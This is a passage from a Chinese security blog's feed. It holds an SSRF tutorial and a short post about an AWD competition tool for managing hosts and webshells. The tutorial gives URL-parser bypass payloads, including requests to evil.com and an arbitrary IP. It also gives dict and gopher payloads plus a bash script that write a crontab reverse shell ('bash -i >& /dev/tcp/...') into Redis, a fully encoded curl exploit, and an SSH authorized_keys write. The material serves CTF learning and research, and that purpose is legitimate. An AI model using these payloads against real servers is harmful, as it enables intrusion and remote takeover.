class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip($url)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="comment">//var_dump($url); </span></span><br><span class="line">        $ch = curl_init(); </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url); </span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        $output = curl_exec($ch); </span><br><span class="line">        $result_info = curl_getinfo($ch); </span><br><span class="line">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        curl_close($ch); </span><br><span class="line">        var_dump($output); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$url = $_POST[<span class="string">'url'</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123; </span><br><span class="line">    safe_request_url($url); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//hint23333: </span></span><br><span class="line"><span class="comment">//flag in flag.php </span></span><br><span class="line"><span class="comment">//phpinfo in phpinfo.php </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接访问flag.php返回Your ip is not 127.0.0.1,so you can not see flag!</p><p>即需要其自身访问<a href="http://127.0.0.1/flag.php" target="_blank" rel="noopener">http://127.0.0.1/flag.php</a></p><p>从代码来看，其通过parse_url获取<code>$url</code>的hostname，判断是否是本地地址，只有非本地地址才会用curl访问</p><p>利用parse_url与libcurl对curl的解析差异的trick</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">完整url: scheme:[//[user[:password]@]host[:port]][/path][?query][#fragment]</span><br><span class="line">这里仅讨论url中不含&apos;?&apos;的情况</span><br><span class="line"></span><br><span class="line">php parse_url：</span><br><span class="line">host: 匹配最后一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">libcurl：</span><br><span class="line">host：匹配第一个@后面符合格式的host</span><br><span class="line"></span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">http://u:p@a.com:80@b.com/</span><br><span class="line"></span><br><span class="line">php解析结果：</span><br><span class="line">    schema: http </span><br><span class="line">    host: b.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p@a.com:80</span><br><span class="line">libcurl解析结果：</span><br><span class="line">    schema: http</span><br><span class="line">    host: a.com</span><br><span class="line">    user: u</span><br><span class="line">    pass: p</span><br><span class="line">    port: 80</span><br><span class="line">    后面的@b.com/会被忽略掉</span><br></pre></td></tr></table></figure><p>这里当<code>$url</code>为<code>http://u:p@127.0.0.1:80@baidu.com/flag.php</code>时</p><p>parse_url的解析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = parse_url(<span class="string">'http://u:p@127.0.0.1:80@baidu.com/flag.php'</span>); var_dump($a);</span><br><span class="line"><span class="keyword">array</span>(<span class="number">5</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"baidu.com"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">1</span>) <span class="string">"u"</span></span><br><span class="line">  [<span class="string">"pass"</span>]=&gt;</span><br><span class="line">  string(<span class="number">14</span>) <span class="string">"p@127.0.0.1:80"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">9</span>) <span class="string">"/flag.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问flag.php</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5bc84fc8009c0.png" alt="11.png"></p><h3 id="0x04-filter-var-绕过"><a href="#0x04-filter-var-绕过" class="headerlink" title="0x04 filter_var( )绕过"></a>0x04 filter_var( )绕过</h3><p>filter_var — 使用特定的过滤器过滤一个变量</p><p>用法：</p><p><code>filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] ) : mixed</code></p><p><code>FILTER_VALIDATE_EMAIL</code> 检查是否为有效邮箱</p><p><code>FILTER_VALIDATE_URL</code> 检查是否为有效url</p><p>引用国外一篇文章中的示例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Argument: "</span>.$argv[<span class="number">1</span>].<span class="string">"n"</span>;</span><br><span class="line">   <span class="comment">// check if argument is a valid URL</span></span><br><span class="line">   <span class="keyword">if</span>(filter_var($argv[<span class="number">1</span>], FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      <span class="comment">// parse URL</span></span><br><span class="line">      $r = parse_url($argv[<span class="number">1</span>]);</span><br><span class="line">      print_r($r);</span><br><span class="line">      <span class="comment">// check if host ends with google.com</span></span><br><span class="line">      <span class="keyword">if</span>(preg_match(<span class="string">'/google.com$/'</span>, $r[<span class="string">'host'</span>])) &#123;</span><br><span class="line">         <span class="comment">// get page from URL</span></span><br><span class="line">         exec(<span class="string">'curl -v -s "'</span>.$r[<span class="string">'host'</span>].<span class="string">'"'</span>, $a);</span><br><span class="line">         print_r($a);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Error: Host not allowed"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Error: Invalid URL"</span>;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>filter_var</code>对url进行check，<code>parse_url</code>获取url的host，对host进行正则匹配，判断是否以google.com结尾，是则curl访问</p><p>这个关键还是看curl能否访问</p><p>之前文章中可能是在PHP7.0.25 cURL 7.47.0的近似环境下，所以有以下bypass方法</p><ul><li><p>通过制定端口让google.com不被解析成主机名</p><ul><li><p><code>0://evil.com:80;google.com:80/</code></p></li><li><p><code>0://evil.com:80,google.com:80/</code></p></li></ul></li><li><p>利用bash空变量，请求evil.com</p><ul><li><code>0://evil$google.com</code></li></ul></li></ul><p>在 PHP Version 7.1.19,cURL 7.54.0 环境下，大部分bybass就不管用了</p><p>但可以使用<code>url=0://107.172.6.33:7788;baidu.com:80/</code>达到请求任意ip，任意端口的目的，前提是代码中exec curl那行没有双引号</p><p>猜测7.45.0的curl应该是对port进行了检测</p><p>不过测试发现php 7.2.2，cURL 7.52.1环境下同样有问题</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c409f1eb6c57.png" alt></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c409fb3e0ff0.png" alt></p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="0x01-302跳转"><a href="#0x01-302跳转" class="headerlink" title="0x01 302跳转"></a>0x01 302跳转</h3><p>要求服务端一般为cURL方法，CURLOPT_FOLLOWLOCATION为TRUE, 若服务器端对host进行了过滤，如过滤本地host，此时可用302跳转</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>                                                                                                                                                </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;                                                         </span><br><span class="line">    $ch = curl_init();                                                       </span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);                                     </span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);                                     </span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">true</span>);                          </span><br><span class="line">    curl_exec($ch);                                                          </span><br><span class="line">    curl_close($ch);                                                         </span><br><span class="line">&#125;                                                                            </span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];                                                                                                                           </span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><table><thead><tr><th>常见协议利用</th><th></th></tr></thead><tbody><tr><td>Http/s 协议</td><td><a href="http://example.com:8080/" target="_blank" rel="noopener">http://example.com:8080/</a></td></tr><tr><td>Dict 协议</td><td>dict://example.com:8080/helo:dict</td></tr><tr><td>Gopher 协议</td><td>gopher://example.com:8080/gopher</td></tr><tr><td>File 协议</td><td>file:///etc/passwd</td></tr></tbody></table><p>302跳转可以使用http/https, dict, gopher协议，不支持file，详细见: <a href="https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html" target="_blank" rel="noopener">https://curl.haxx.se/libcurl/c/CURLOPT_FOLLOWLOCATION.html</a></p><ul><li>dict协议探测主机</li></ul><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c3f235c390ab.png" alt></p><p>dict://127.0.0.1:6379/info查看redis配置信息</p><p>发出以下dict请求可以用redis反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dict://127.0.0.1:6379/config:set:dir:/var/spool/cron</span><br><span class="line">dict://127.0.0.1:6379/config:set:dbfilename:root</span><br><span class="line">dict://127.0.0.1:6379/set:1:nn*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1nn</span><br><span class="line">dict://127.0.0.1:6379/save</span><br></pre></td></tr></table></figure><ul><li>Gopher 协议拓展攻击面</li></ul><h3 id="0x02-Gopher"><a href="#0x02-Gopher" class="headerlink" title="0x02 Gopher"></a>0x02 Gopher</h3><h4 id="利用Gopher协议进行redis反弹shell"><a href="#利用Gopher协议进行redis反弹shell" class="headerlink" title="利用Gopher协议进行redis反弹shell"></a>利用Gopher协议进行redis反弹shell</h4><p>redis反弹shell的bash脚本，以<code>bash this.sh 127.0.0.1 6379</code>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;|redis-cli -h $1 -p $2 -x set 1</span><br><span class="line">redis-cli -h $1 -p $2 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 -p $2 config set dbfilename root</span><br><span class="line">redis-cli -h $1 -p $2 save</span><br><span class="line">redis-cli -h $1 -p $2 quit</span><br></pre></td></tr></table></figure><blockquote><p>原理是写入反弹shell的crontab计划任务</p></blockquote><p>使用gopher协议实现redis反弹shell，一般用socat端口转发以捕获redis攻击的数据包</p><p><code>socat -v tcp-listen:8888,fork tcp-connect:localhost:6379</code></p><p>用JoyChou大佬的脚本把数据转为gopher格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">'&gt;&lt;+'</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">            exp = exp + <span class="string">'%0a'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line"><span class="keyword">print</span> exp</span><br></pre></td></tr></table></figure><p>本地测试写入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://127.0.0.1/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c40766b56d84.png" alt></p><p>这里有个问题，有时写入中可能有截断，或是crontab现在对格式要求严格，比如任务要指明用户之类的，写入的crontab任务不能被成功执行</p><p>发现另一种getshell方法就是写authorized_keys到/root/.ssh，另外也可改写Apache等web软件的配置文件以getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set 1 &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsJ4pbjXL5KnnX/FP6sZORaT3N8/A6SEYv23VfrIVoPdOCBVD98O+RExVWCe8Iknwzx3w1Hm2uWnB6i6AtCnIji3yz16HIPryzoLE65xN4Z2vGXZk2YmOuRtqFPKPk/QCdf1Vxh6lwLZRo2msYEK/+mziOrmYy1UzwqLxfl1uNYVYTs2jHGBEikPwA7FAt5ZVRRBhzDnn8dyT201FOwR/fpukiXbaevZU2/iyW+Qu9ssaZMJMpRzautNuZLxCmV9TfuP0NbsgCBHj1nOMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl/NWWQADOY2dMHMWuTtCxLSrfY/q+H8l+JGdQpw==\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>curl/libcurl 7.43 上 gopher 协议存在 bug（%00 截断），7.45 以上无此bug</li></ul><h4 id="FastCGI攻击"><a href="#FastCGI攻击" class="headerlink" title="FastCGI攻击"></a>FastCGI攻击</h4><p>条件</p><ul><li>libcurl版本&gt;=7.45.0</li><li>PHP-FPM监听端口</li><li>PHP-FPM版本 &gt;= 5.3.3</li><li>知道服务器上任意一个php文件的绝对路径</li></ul><p>防止%00截断，cURL大于7.45.0</p><p>这里有一个gopher链接生成工具</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c41ffb1cf0e7.png" alt></p><h3 id="DNS重绑攻击"><a href="#DNS重绑攻击" class="headerlink" title="DNS重绑攻击"></a>DNS重绑攻击</h3><p>网上原理多为文字，可能不太易懂，画图形象</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/SSRF.assets/5c3df58ad59ce.png" alt></p><p>关键是利用服务端第一次去请求DNS服务和第二次进行域名解析即访问URL之间的的时间差，利用这个时间差进行DNS重绑定攻击</p><p>还有就是DNS服务器需要设置TTL=0，TTL为DNS服务器里域名和IP绑定关系的cache存活的时间</p><p>实现方法：</p><ol><li><p>设置TTL，0ctF2016的monkey题目就是利用DNS重绑攻击绕过，国外域名一般可以设置TTL=0</p></li><li><p>还有种方法就是设置两条A记录给域名一个解析的ip为外网，另一个解析的ip为内网，那么这就成了概率问题，一次访问有1/4的概率访问内网</p></li><li><p>直接自建DNS服务器，比如dnspython等模块</p></li></ol><hr><h4 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h4><p><a href="https://www.jianshu.com/p/b31b7b1ca3cb" target="_blank" rel="noopener">https://www.jianshu.com/p/b31b7b1ca3cb</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#_5" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/web/ssrf/#_5</a></p><p><a href="https://www.from0to1.me/2018/03/07/31.html" target="_blank" rel="noopener">https://www.from0to1.me/2018/03/07/31.html</a></p><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p><p><a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51" target="_blank" rel="noopener">https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51</a></p><p><a href="https://toutiao.io/posts/qf9jsx/preview" target="_blank" rel="noopener">https://toutiao.io/posts/qf9jsx/preview</a></p><p><a href="http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/</a></p><p><a href="http://www.likesec.com/2017/12/28/SSRF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F" target="_blank" rel="noopener">http://www.likesec.com/2017/12/28/SSRF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87/#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F</a></p><p><a href="http://www.zhhr168.com/2016/12/03/redis-getshell/index.htm" target="_blank" rel="noopener">http://www.zhhr168.com/2016/12/03/redis-getshell/index.htm</a></p><p><a href="https://xz.aliyun.com/t/2115" target="_blank" rel="noopener">https://xz.aliyun.com/t/2115</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;即恶意使用Web应用作为代理攻击其他本地或远程服务器的攻击方法，称其为服务端请求伪造攻击（Server-side Request Forgery），常用来探测内网，攻击内网应用&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="SSRF" scheme="http://j0k3r.top/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>AWD_Hunter</title>
    <link href="http://j0k3r.top/2019/01/21/AWD_Hunter/"/>
    <id>http://j0k3r.top/2019/01/21/AWD_Hunter/</id>
    <published>2019-01-20T16:00:00.000Z</published>
    <updated>2020-03-26T11:03:41.669Z</updated>
    
    <content type="html"><![CDATA[<p>基于Python2.7的AWD自动化工具</p><a id="more"></a><p>免得比赛时手忙脚乱，时间有限，后续或加入自动submit flag什么的</p><p>安装依赖库</p><p><code>sudo python -m pip install -r requirements.txt</code></p><p>运行</p><p><code>Usage：python run.py</code></p><p>过程中间对整体代码进行了重构和优化，理清程序逻辑，提高代码的可读性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── app//程序主体</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── __init__.pyc</span><br><span class="line">│   ├── app_common_class.py</span><br><span class="line">│   ├── app_common_class.pyc</span><br><span class="line">│   ├── app_core.py</span><br><span class="line">│   ├── app_core.pyc</span><br><span class="line">│   ├── app_func.py</span><br><span class="line">│   └── app_func.pyc</span><br><span class="line">├── extension//拓展模块</span><br><span class="line">│   └── ssh-auto-chpass.py</span><br><span class="line">├── run.py//运行</span><br><span class="line">├── runtime</span><br><span class="line">│   └── log.json//log文件</span><br><span class="line">└── script//存放脚本</span><br><span class="line">    ├── php</span><br><span class="line">    │   ├── log-record.php</span><br><span class="line">    │   └── null_shell.php</span><br><span class="line">    └── py</span><br><span class="line">        └── addlog.py</span><br></pre></td></tr></table></figure><p>主要使用paramiko和重写cmd基本类方法实现ssh连接和程序交互式命令行处理</p><p>使用json格式储存数据更灵活方便</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/AWD_Hunter.assets/5c431123ca36b.png" alt></p><p>ps查看查看记录的主机和webshell</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/AWD_Hunter.assets/5c442f2fe8f23.png" alt></p><p>使用ps中的序号就可以直接连接主机或者webshell</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/AWD_Hunter.assets/5c442f7ee7bf5.png" alt></p><p>Github: <a href="https://github.com/zhuxianjin/AWD_Hunter" target="_blank" rel="noopener">https://github.com/zhuxianjin/AWD_Hunter</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;基于Python2.7的AWD自动化工具&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://j0k3r.top/tags/Python/"/>
    
      <category term="AWD" scheme="http://j0k3r.top/tags/AWD/"/>
    
  </entry>
  
</feed>
